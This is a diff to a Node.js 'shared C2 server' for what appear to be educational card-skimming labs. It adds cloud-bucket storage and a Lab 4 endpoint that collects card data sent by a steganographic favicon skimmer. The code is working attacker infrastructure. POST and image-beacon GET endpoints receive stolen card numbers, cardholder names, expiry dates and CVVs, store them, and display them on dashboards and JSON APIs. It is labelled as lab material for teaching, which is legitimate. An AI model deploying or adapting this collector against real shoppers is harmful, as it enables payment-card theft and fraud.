@@ -9,6 +9,9 @@
  * Lab 2: /lab2/c2/*   — DOM-based skimming
  * Lab 3: /lab3/extension/* — browser extension hijacking
  *
+ * Data persistence: GCS buckets when LAB*_BUCKET env vars are set;
+ * local filesystem otherwise (local development only).
+ *
  * FOR EDUCATIONAL PURPOSES ONLY
  */
 
@@ -24,21 +27,73 @@ const PORT = process.env.PORT || 3000
 // Trust the GFE/Cloud Run proxy so req.ip reflects X-Forwarded-For
 app.set('trust proxy', true)
 
-// Per-lab data directories (volume-mounted to lab-specific stolen-data folders)
+// ============================================================
+// GCS STORAGE LAYER
+// ============================================================
+
+let gcs = null
+const BUCKETS = {
+  lab1: process.env.LAB1_BUCKET,
+  lab2: process.env.LAB2_BUCKET,
+  lab3: process.env.LAB3_BUCKET,
+  lab4: process.env.LAB4_BUCKET
+}
+
+if (BUCKETS.lab1 || BUCKETS.lab2 || BUCKETS.lab3 || BUCKETS.lab4) {
+  const { Storage } = require('@google-cloud/storage')
+  gcs = new Storage()
+  console.log('GCS storage enabled:', BUCKETS)
+}
+
+function useGCS(lab) {
+  return !!(gcs && BUCKETS[lab])
+}
+
+async function gcsSaveJSON(lab, name, data) {
+  await gcs.bucket(BUCKETS[lab]).file(name).save(
+    JSON.stringify(data, null, 2),
+    { contentType: 'application/json', metadata: { cacheControl: 'no-cache' } }
+  )
+}
+
+async function gcsListJSON(lab, prefix, options = {}) {
+  const [files] = await gcs.bucket(BUCKETS[lab]).getFiles({ prefix, ...options })
+  return files
+}
+
+async function gcsDownloadJSON(file) {
+  const [content] = await file.download()
+  return JSON.parse(content.toString())
+}
+
+// ============================================================
+// LOCAL FILE STORAGE (fallback for local dev)
+// ============================================================
+
 const DATA_DIRS = {
   lab1: process.env.LAB1_DATA_DIR || '/app/data/lab1',
   lab2: process.env.LAB2_DATA_DIR || '/app/data/lab2',
-  lab3: process.env.LAB3_DATA_DIR || '/app/data/lab3'
+  lab3: process.env.LAB3_DATA_DIR || '/app/data/lab3',
+  lab4: process.env.LAB4_DATA_DIR || '/app/data/lab4'
 }
 
-// Middleware
+if (!useGCS('lab1') || !useGCS('lab2') || !useGCS('lab3') || !useGCS('lab4')) {
+  Object.entries(DATA_DIRS).forEach(([lab, dir]) => {
+    if (!useGCS(lab) && !fs.existsSync(dir)) {
+      fs.mkdirSync(dir, { recursive: true })
+    }
+  })
+}
+
+// ============================================================
+// MIDDLEWARE
+// ============================================================
+
 app.use(cors())
 app.use(express.json({ limit: '10mb' }))
 app.use(express.urlencoded({ extended: true, limit: '10mb' }))
 
 // sendBeacon sends Content-Type: text/plain — parse it as JSON body.
-// express.urlencoded() sets req.body = {} even for non-matching content types,
-// so check for empty object as well as falsy.
 app.use((req, res, next) => {
   const bodyEmpty = !req.body || (typeof req.body === 'object' && Object.keys(req.body).length === 0)
   if (req.method === 'POST' && req.is('text/plain') && bodyEmpty) {
@@ -50,13 +105,6 @@ app.use((req, res, next) => {
     })
   } else {
     next()
-  }
-})
-
-// Ensure all data directories exist on startup
-Object.values(DATA_DIRS).forEach(dir => {
-  if (!fs.existsSync(dir)) {
-    fs.mkdirSync(dir, { recursive: true })
   }
 })
 
@@ -74,6 +122,20 @@ function maskCardNumber(cardNumber) {
 function sanitizeForLog(input) {
   if (typeof input !== 'string') input = String(input)
   return input.replace(/[\r\n\t\x00-\x1f\x7f]/g, ' ').substring(0, 500)
+}
+
+function escapeHTML(input) {
+  if (input === undefined || input === null) return ''
+  return String(input)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+}
+
+function uniqueSuffix() {
+  return Date.now() + '_' + Math.random().toString(36).substring(2, 7)
 }
 
 // ============================================================
@@ -95,18 +157,27 @@ function validateCardData(data) {
   return { valid: issues.length === 0, issues }
 }
 
-async function lab1LogStolenData(data) {
-  const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
-  const filename = `stolen_${timestamp}.json`
-  const filepath = path.join(DATA_DIRS.lab1, filename)
-  await fsPromises.writeFile(filepath, JSON.stringify(data, null, 2), 'utf8')
-  return filename
+async function lab1SaveRecord(data) {
+  const name = `stolen_${uniqueSuffix()}`
+  if (useGCS('lab1')) {
+    await gcsSaveJSON('lab1', `records/${name}.json`, data)
+  } else {
+    await fsPromises.writeFile(path.join(DATA_DIRS.lab1, `${name}.json`), JSON.stringify(data, null, 2), 'utf8')
+  }
+  return name
 }
 
-async function lab1AppendMasterLog(data) {
-  const logPath = path.join(DATA_DIRS.lab1, 'master-log.jsonl')
-  const entry = JSON.stringify({ timestamp: new Date().toISOString(), ...data }) + '\n'
-  await fsPromises.appendFile(logPath, entry, 'utf8')
+async function lab1LoadAllRecords() {
+  if (useGCS('lab1')) {
+    const files = await gcsListJSON('lab1', 'records/')
+    const records = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
+    return records.filter(Boolean)
+  }
+  const files = (await fsPromises.readdir(DATA_DIRS.lab1)).filter(f => f.endsWith('.json'))
+  const records = await Promise.all(
+    files.map(f => fsPromises.readFile(path.join(DATA_DIRS.lab1, f), 'utf8').then(JSON.parse).catch(() => null))
+  )
+  return records.filter(Boolean)
 }
 
 // POST /lab1/c2/collect — receives stolen card data
@@ -133,10 +204,8 @@ app.post('/lab1/c2/collect', async (req, res) => {
       console.log(`[Lab1-C2] ⚠️  INCOMPLETE: ${validation.issues.join(', ')}`)
     }
 
-    const filename = await lab1LogStolenData(stolenData)
-    await lab1AppendMasterLog(stolenData)
-
-    res.status(200).json({ status: 'ok', id: filename.replace('.json', '') })
+    const name = await lab1SaveRecord(stolenData)
+    res.status(200).json({ status: 'ok', id: name })
   } catch (error) {
     console.error('[Lab1-C2] Error:', error)
     res.status(200).json({ status: 'ok' })
@@ -165,8 +234,7 @@ app.get('/lab1/c2/collect', async (req, res) => {
         }
 
         lab1Stats.totalRecords++
-        await lab1LogStolenData(cleanData)
-        await lab1AppendMasterLog(cleanData)
+        await lab1SaveRecord(cleanData)
       }
     }
   } catch (error) {
@@ -181,23 +249,12 @@ app.get('/lab1/c2/collect', async (req, res) => {
 // GET /lab1/c2/ and /lab1/c2 — dashboard
 app.get(['/lab1/c2', '/lab1/c2/'], async (req, res) => {
   try {
-    const files = await fsPromises.readdir(DATA_DIRS.lab1)
-    const jsonFiles = files.filter(f => f.endsWith('.json'))
-    const records = []
-
-    for (const file of jsonFiles) {
-      try {
-        const content = await fsPromises.readFile(path.join(DATA_DIRS.lab1, file), 'utf8')
-        records.push(JSON.parse(content))
-      } catch (_) {}
-    }
-
+    const records = await lab1LoadAllRecords()
     records.sort((a, b) => {
       const tA = a.server?.receivedAt || ''
       const tB = b.server?.receivedAt || ''
       return tB.localeCompare(tA)
     })
-
     res.send(generateLab1Dashboard(records))
   } catch (error) {
     res.status(500).send('Dashboard error')
@@ -207,23 +264,12 @@ app.get(['/lab1/c2', '/lab1/c2/'], async (req, res) => {
 // GET /lab1/c2/api/stolen
 app.get('/lab1/c2/api/stolen', async (req, res) => {
   try {
-    const files = await fsPromises.readdir(DATA_DIRS.lab1)
-    const jsonFiles = files.filter(f => f.endsWith('.json') && f !== 'master-log.jsonl')
-    const records = []
-
-    for (const file of jsonFiles) {
-      try {
-        const content = await fsPromises.readFile(path.join(DATA_DIRS.lab1, file), 'utf8')
-        records.push(JSON.parse(content))
-      } catch (_) {}
-    }
-
+    const records = await lab1LoadAllRecords()
     records.sort((a, b) => {
       const tA = a.server?.receivedAt || ''
       const tB = b.server?.receivedAt || ''
       return tB.localeCompare(tA)
     })
-
     res.json(records)
   } catch (error) {
     res.status(500).json({ error: 'Error loading stolen data' })
@@ -232,7 +278,7 @@ app.get('/lab1/c2/api/stolen', async (req, res) => {
 
 // GET /lab1/c2/stats
 app.get('/lab1/c2/stats', (req, res) => {
-  res.json({ ...lab1Stats, dataDirectory: DATA_DIRS.lab1 })
+  res.json({ ...lab1Stats, dataDirectory: useGCS('lab1') ? `gs://${BUCKETS.lab1}` : DATA_DIRS.lab1 })
 })
 
 // GET /lab1/c2/health
@@ -295,27 +341,11 @@ let lab2Stats = {
   startTime: Date.now()
 }
 
-const LAB2_STOLEN_FILE = path.join(DATA_DIRS.lab2, 'stolen.json')
-const LAB2_ANALYSIS_DIR = path.join(DATA_DIRS.lab2, 'analysis')
-
-if (!fs.existsSync(LAB2_ANALYSIS_DIR)) {
-  fs.mkdirSync(LAB2_ANALYSIS_DIR, { recursive: true })
-}
-
-function lab2SaveAttackData(attackType, data) {
-  const enriched = { ...data, serverTimestamp: Date.now(), serverTime: new Date().toISOString(), attackType }
-  let existing = []
-
-  if (fs.existsSync(LAB2_STOLEN_FILE)) {
-    try {
-      existing = JSON.parse(fs.readFileSync(LAB2_STOLEN_FILE, 'utf8'))
-      if (!Array.isArray(existing)) existing = []
-    } catch (_) { existing = [] }
+if (!useGCS('lab2')) {
+  const LAB2_ANALYSIS_DIR = path.join(DATA_DIRS.lab2, 'analysis')
+  if (!fs.existsSync(LAB2_ANALYSIS_DIR)) {
+    fs.mkdirSync(LAB2_ANALYSIS_DIR, { recursive: true })
   }
-
-  existing.push(enriched)
-  fs.writeFileSync(LAB2_STOLEN_FILE, JSON.stringify(existing, null, 2))
-  return LAB2_STOLEN_FILE
 }
 
 function lab2AnalyzeAttackData(data) {
@@ -359,8 +389,40 @@ function lab2UpdateStats(data) {
   }
 }
 
+async function lab2SaveAttackRecord(attackType, data) {
+  const enriched = { ...data, serverTimestamp: Date.now(), serverTime: new Date().toISOString(), attackType }
+  if (useGCS('lab2')) {
+    await gcsSaveJSON('lab2', `submissions/submit_${uniqueSuffix()}.json`, enriched)
+  } else {
+    const LAB2_STOLEN_FILE = path.join(DATA_DIRS.lab2, 'stolen.json')
+    let existing = []
+    if (fs.existsSync(LAB2_STOLEN_FILE)) {
+      try {
+        existing = JSON.parse(fs.readFileSync(LAB2_STOLEN_FILE, 'utf8'))
+        if (!Array.isArray(existing)) existing = []
+      } catch (_) { existing = [] }
+    }
+    existing.push(enriched)
+    fs.writeFileSync(LAB2_STOLEN_FILE, JSON.stringify(existing, null, 2))
+  }
+}
+
+async function lab2LoadAllRecords() {
+  if (useGCS('lab2')) {
+    const files = await gcsListJSON('lab2', 'submissions/')
+    const records = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
+    return records.filter(Boolean)
+  }
+  const LAB2_STOLEN_FILE = path.join(DATA_DIRS.lab2, 'stolen.json')
+  if (!fs.existsSync(LAB2_STOLEN_FILE)) return []
+  try {
+    const data = JSON.parse(fs.readFileSync(LAB2_STOLEN_FILE, 'utf8'))
+    return Array.isArray(data) ? data : []
+  } catch (_) { return [] }
+}
+
 // POST /lab2/c2/collect
-app.post('/lab2/c2/collect', (req, res) => {
+app.post('/lab2/c2/collect', async (req, res) => {
   try {
     const attackData = req.body
     const clientIp = sanitizeForLog(req.ip || req.connection.remoteAddress || 'unknown')
@@ -378,10 +440,15 @@ app.post('/lab2/c2/collect', (req, res) => {
     lab2UpdateStats(attackData)
 
     const analysis = lab2AnalyzeAttackData(attackData)
-    lab2SaveAttackData(analysis.attackType, attackData)
+    await lab2SaveAttackRecord(analysis.attackType, attackData)
 
-    const analysisPath = path.join(LAB2_ANALYSIS_DIR, `analysis_${Date.now()}.json`)
-    fs.writeFileSync(analysisPath, JSON.stringify(analysis, null, 2))
+    // Save analysis as a separate GCS object (or local file)
+    if (useGCS('lab2')) {
+      await gcsSaveJSON('lab2', `analysis/analysis_${uniqueSuffix()}.json`, analysis)
+    } else {
+      const analysisPath = path.join(DATA_DIRS.lab2, 'analysis', `analysis_${Date.now()}.json`)
+      fs.writeFileSync(analysisPath, JSON.stringify(analysis, null, 2))
+    }
 
     res.json({
       success: true,
@@ -396,13 +463,9 @@ app.post('/lab2/c2/collect', (req, res) => {
 })
 
 // GET /lab2/c2/ and /lab2/c2 — dashboard
-app.get(['/lab2/c2', '/lab2/c2/'], (req, res) => {
+app.get(['/lab2/c2', '/lab2/c2/'], async (req, res) => {
   try {
-    let records = []
-    if (fs.existsSync(LAB2_STOLEN_FILE)) {
-      records = JSON.parse(fs.readFileSync(LAB2_STOLEN_FILE, 'utf8'))
-      if (!Array.isArray(records)) records = []
-    }
+    const records = await lab2LoadAllRecords()
     res.send(generateLab2Dashboard(records))
   } catch (error) {
     res.status(500).send('Dashboard error')
@@ -410,10 +473,9 @@ app.get(['/lab2/c2', '/lab2/c2/'], (req, res) => {
 })
 
 // GET /lab2/c2/api/stolen
-app.get('/lab2/c2/api/stolen', (req, res) => {
+app.get('/lab2/c2/api/stolen', async (req, res) => {
   try {
-    if (!fs.existsSync(LAB2_STOLEN_FILE)) return res.json([])
-    const data = JSON.parse(fs.readFileSync(LAB2_STOLEN_FILE, 'utf8'))
+    const data = await lab2LoadAllRecords()
     res.json(data)
   } catch (error) {
     res.status(500).json({ error: 'Error fetching data' })
@@ -430,19 +492,14 @@ app.get('/lab2/c2/stats', (req, res) => {
 })
 
 // GET /lab2/c2/recent/:n?
-app.get('/lab2/c2/recent/:count?', (req, res) => {
+app.get('/lab2/c2/recent/:count?', async (req, res) => {
   try {
     const count = parseInt(req.params.count) || 10
-    const files = fs.readdirSync(DATA_DIRS.lab2)
-      .filter(f => f.endsWith('.json') && f !== 'stolen.json')
-      .sort((a, b) => fs.statSync(path.join(DATA_DIRS.lab2, b)).mtime - fs.statSync(path.join(DATA_DIRS.lab2, a)).mtime)
-      .slice(0, count)
-
-    const recent = files.map(file => {
-      const data = JSON.parse(fs.readFileSync(path.join(DATA_DIRS.lab2, file), 'utf8'))
-      return { filename: file, timestamp: data.serverTimestamp || data.timestamp, type: data.type }
-    })
-
+    const records = await lab2LoadAllRecords()
+    const recent = records.slice(-count).reverse().map(r => ({
+      timestamp: r.serverTimestamp || r.timestamp,
+      type: r.type
+    }))
     res.json(recent)
   } catch (error) {
     res.status(500).json({ error: 'Error fetching data' })
@@ -471,7 +528,6 @@ function extractCardFields(formData) {
 }
 
 function generateLab2Dashboard(records) {
-  // Show any record that is a form_submission OR has card fields in formData
   const submissions = records.filter(r =>
     r.type === 'form_submission' ||
     (r.formData && Object.values(r.formData).some(f => f && f.value))
@@ -592,11 +648,12 @@ function lab3AnalyzePayload(payload) {
   return analysis
 }
 
-async function lab3SaveDataToFile(dataEntry) {
-  try {
+async function lab3SaveEntry(dataEntry) {
+  if (useGCS('lab3')) {
+    await gcsSaveJSON('lab3', `sessions/${dataEntry.id}.json`, dataEntry)
+  } else {
     const today = new Date().toISOString().split('T')[0]
     const logFile = path.join(DATA_DIRS.lab3, `extension-data-${today}.log`)
-
     const logEntry = {
       timestamp: dataEntry.timestamp,
       id: dataEntry.id,
@@ -607,7 +664,6 @@ async function lab3SaveDataToFile(dataEntry) {
       dataTypes: dataEntry.analysis.dataTypes,
       sensitiveCount: dataEntry.analysis.sensitiveFieldCount
     }
-
     await fsPromises.appendFile(logFile, JSON.stringify(logEntry) + '\n')
 
     const dataFile = path.join(DATA_DIRS.lab3, `full-data-${today}.json`)
@@ -616,11 +672,21 @@ async function lab3SaveDataToFile(dataEntry) {
       const existing = await fsPromises.readFile(dataFile, 'utf8')
       existingData = JSON.parse(existing)
     } catch (_) {}
-
     existingData.push(dataEntry)
     await fsPromises.writeFile(dataFile, JSON.stringify(existingData, null, 2))
-  } catch (error) {
-    console.error('[Lab3-C2] Error saving data:', error)
+  }
+}
+
+// On startup, preload lab3 data from GCS into memory
+async function lab3Preload() {
+  if (!useGCS('lab3')) return
+  try {
+    const files = await gcsListJSON('lab3', 'sessions/')
+    const entries = await Promise.all(files.map(f => gcsDownloadJSON(f).catch(() => null)))
+    lab3CollectedData = entries.filter(Boolean)
+    console.log(`[Lab3-C2] Preloaded ${lab3CollectedData.length} sessions from GCS`)
+  } catch (err) {
+    console.error('[Lab3-C2] GCS preload failed:', err.message)
   }
 }
 
@@ -653,7 +719,7 @@ app.post('/lab3/extension/stolen-data', async (req, res) => {
 
     if (lab3CollectedData.length > 1000) lab3CollectedData = lab3CollectedData.slice(-1000)
 
-    await lab3SaveDataToFile(dataEntry)
+    await lab3SaveEntry(dataEntry)
 
     res.status(200).json({ success: true, message: 'Data received', dataId: dataEntry.id, timestamp })
   } catch (error) {
@@ -743,20 +809,192 @@ app.get('/health', (req, res) => {
 })
 
 // ============================================================
+// LAB 4 — STEGANOGRAPHY FAVICON C2
+// Receives card data exfiltrated by the stego skimmer hidden
+// in favicon.ico. Payload fields: card_number, card_name,
+// expiry, cvv, source, timestamp, url.
+// ============================================================
+
+let lab4Records = []
+let lab4Stats = { totalRecords: 0, startTime: Date.now() }
+const LAB4_MAX_RECORDS = 1000
+const LAB4_PRELOAD_LIMIT = 500
+
+async function lab4SaveRecord(record) {
+  if (useGCS('lab4')) {
+    await gcsSaveJSON('lab4', `records/${record.id}.json`, record)
+  } else {
+    await fsPromises.writeFile(
+      path.join(DATA_DIRS.lab4, `${record.id}.json`),
+      JSON.stringify(record, null, 2)
+    )
+  }
+}
+
+async function lab4Preload() {
+  if (!useGCS('lab4')) return
+  try {
+    const files = await gcsListJSON('lab4', 'records/', { maxResults: LAB4_PRELOAD_LIMIT })
+    const sortedFiles = files
+      .map(file => ({
+        file,
+        updated: Date.parse(file.metadata?.updated || file.metadata?.timeCreated || 0) || 0
+      }))
+      .sort((a, b) => b.updated - a.updated)
+      .slice(0, LAB4_PRELOAD_LIMIT)
+    const entries = await Promise.all(sortedFiles.map(f => gcsDownloadJSON(f.file).catch(() => null)))
+    lab4Records = entries.filter(Boolean)
+    if (lab4Records.length > LAB4_MAX_RECORDS) {
+      lab4Records = lab4Records.slice(-LAB4_MAX_RECORDS)
+    }
+    lab4Stats.totalRecords = lab4Records.length
+    console.log(`[Lab4-C2] Preloaded ${lab4Records.length} records from GCS`)
+  } catch (e) {
+    console.error('[Lab4-C2] Preload error:', e.message)
+  }
+}
+
+// POST /lab4/c2/collect — skimmer sends stolen card data
+app.post('/lab4/c2/collect', async (req, res) => {
+  const ts = new Date().toISOString()
+  const body = req.body || {}
+
+  const rawCard = String(body.card_number || '').replace(/[\s-]/g, '')
+  const maskedCard = rawCard.length >= 8
+    ? rawCard.slice(0, 4) + ' **** **** ' + rawCard.slice(-4)
+    : '****'
+
+  const record = {
+    id: `stego-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+    timestamp: ts,
+    masked_card: maskedCard,
+    cvv: body.cvv,
+    card_name: body.card_name,
+    expiry: body.expiry,
+    source: body.source || 'favicon-steganography',
+    url: body.url
+  }
+
+  lab4Records.push(record)
+  lab4Stats.totalRecords++
+  if (lab4Records.length > LAB4_MAX_RECORDS) {
+    lab4Records = lab4Records.slice(-LAB4_MAX_RECORDS)
+  }
+
+  try { await lab4SaveRecord(record) } catch (e) { console.error('[Lab4-C2] Save error:', e.message) }
+
+  res.status(200).json({ status: 'ok', id: record.id })
+})
+
+// GET /lab4/c2/collect — image beacon fallback (sendBeacon with GET)
+app.get('/lab4/c2/collect', async (req, res) => {
+  const q = req.query
+  if (q.card_number) {
+    const raw = String(q.card_number).replace(/[\s-]/g, '')
+    const record = {
+      id: `stego-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+      timestamp: new Date().toISOString(),
+      masked_card: raw.slice(0, 4) + ' **** **** ' + raw.slice(-4),
+      cvv: q.cvv,
+      source: 'beacon',
+      url: q.url
+    }
+    lab4Records.push(record)
+    lab4Stats.totalRecords++
+    if (lab4Records.length > LAB4_MAX_RECORDS) {
+      lab4Records = lab4Records.slice(-LAB4_MAX_RECORDS)
+    }
+    try {
+      await lab4SaveRecord(record)
+    } catch (error) {
+      console.error('[Lab4-C2] Save error (beacon):', error.message)
+    }
+  }
+  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
+  res.set('Content-Type', 'image/gif').send(gif)
+})
+
+// GET /lab4/c2 and /lab4/c2/ — dashboard
+app.get(['/lab4/c2', '/lab4/c2/'], (req, res) => {
+  res.send(generateLab4Dashboard())
+})
+
+// GET /lab4/c2/api/stolen — JSON API
+app.get('/lab4/c2/api/stolen', (req, res) => {
+  res.json({ success: true, count: lab4Records.length, records: lab4Records, stats: lab4Stats })
+})
+
+// GET /lab4/c2/health
+app.get('/lab4/c2/health', (req, res) => {
+  res.json({ status: 'healthy', lab: 'lab4', timestamp: new Date().toISOString() })
+})
+
+function generateLab4Dashboard() {
+  const recent = lab4Records.slice(-20).reverse()
+  const cardDivs = recent.map(r => {
+    const maskedCard = escapeHTML(r.masked_card || 'N/A')
+    const cvvValue = escapeHTML(r.cvv || '???')
+    const expiry = escapeHTML(r.expiry || 'N/A')
+    const cardName = escapeHTML(r.card_name || 'N/A')
+    const timestamp = escapeHTML(r.timestamp || '')
+    const source = escapeHTML(r.source || '')
+
+    return `
+      <div class="card-record" style="background:#1a1a2e;border:1px solid #e94560;border-radius:8px;padding:15px;margin:10px 0;">
+        <div style="font-size:1.1em;font-weight:bold;color:#e94560;">${maskedCard}</div>
+        <div style="color:#aaa;margin-top:4px;font-size:0.85em;">
+          CVV: ${cvvValue} &nbsp;|&nbsp; Expiry: ${expiry} &nbsp;|&nbsp; Name: ${cardName}
+        </div>
+        <div style="color:#666;font-size:0.8em;margin-top:4px;">${timestamp} &nbsp;•&nbsp; ${source}</div>
+      </div>`
+  }).join('')
+
+  return `<!DOCTYPE html><html><head><title>Lab 4 Steganography C2 Dashboard</title><meta charset="utf-8">
+    <style>body{font-family:'Courier New',monospace;max-width:1000px;margin:0 auto;padding:20px;background:#0f0f1a;color:#e0e0e0}
+    h1{color:#e94560;text-align:center;border-bottom:2px solid #e94560;padding-bottom:10px}
+    .stats{background:#1a1a2e;padding:15px;margin:20px 0;border-radius:5px;border:1px solid #e94560;text-align:center}
+    .warning{background:#7f1d1d;color:#fecaca;padding:15px;margin:20px 0;border-radius:5px;text-align:center;font-weight:bold}
+    .c2-nav a{display:inline-block;padding:8px 16px;margin-right:10px;border:1px solid #e94560;border-radius:4px;color:#e94560;text-decoration:none;font-weight:bold;margin-bottom:15px}
+    .c2-nav a:hover{background:#1a1a2e}
+    #total-count{font-size:3em;font-weight:bold;color:#e94560}</style></head>
+    <body>
+    <h1>⚠️ LAB 4 — STEGANOGRAPHY FAVICON C2 ⚠️</h1>
+    <div class="warning">🚨 EDUCATIONAL DEMONSTRATION ONLY 🚨<br>Receives card data hidden inside favicon.ico via steganography</div>
+    <div class="c2-nav"><a href="/lab4">← Back to Lab</a><a href="/">Home</a><a href="/lab4/c2/api/stolen">JSON API</a></div>
+    <div class="stats">
+      <div id="total-count">${lab4Stats.totalRecords}</div>
+      <p style="color:#aaa;">total cards captured</p>
+    </div>
+    <h2>Captured Cards (last 20)</h2>
+    <div id="card-list">
+      ${lab4Records.length === 0
+        ? '<p style="color:#666;">No data yet — submit the Lab 4 checkout form to see captured cards.</p>'
+        : cardDivs}
+    </div>
+  </body></html>`
+}
+
+// ============================================================
+// SHARED HEALTH
+// ============================================================
+
+// ============================================================
 // START
 // ============================================================
 
-app.listen(PORT, '0.0.0.0', () => {
-  console.log('═══════════════════════════════════════════════════')
-  console.log('🚨 SHARED C2 SERVER OPERATIONAL 🚨')
-  console.log('═══════════════════════════════════════════════════')
-  console.log(`Port: ${PORT}`)
-  console.log('Lab 1 endpoints: /lab1/c2/*')
-  console.log('Lab 2 endpoints: /lab2/c2/*')
-  console.log('Lab 3 endpoints: /lab3/extension/*')
-  console.log('Data directories:')
-  Object.entries(DATA_DIRS).forEach(([lab, dir]) => console.log(`  ${lab}: ${dir}`))
-  console.log('═══════════════════════════════════════════════════')
-  console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️')
-  console.log('═══════════════════════════════════════════════════\n')
+Promise.all([lab3Preload(), lab4Preload()]).then(() => {
+  app.listen(PORT, '0.0.0.0', () => {
+    console.log('═══════════════════════════════════════════════════')
+    console.log('🚨 SHARED C2 SERVER OPERATIONAL 🚨')
+    console.log('═══════════════════════════════════════════════════')
+    console.log(`Port: ${PORT}`)
+    console.log('Lab 1 endpoints: /lab1/c2/*')
+    console.log('Lab 2 endpoints: /lab2/c2/*')
+    console.log('Lab 3 endpoints: /lab3/extension/*')
+    console.log('Lab 4 endpoints: /lab4/c2/*')
+    console.log('Storage:', useGCS('lab1') ? 'GCS' : 'local filesystem')
+    console.log('═══════════════════════════════════════════════════')
+    console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️')
+    console.log('═══════════════════════════════════════════════════\n')
+  })
 })
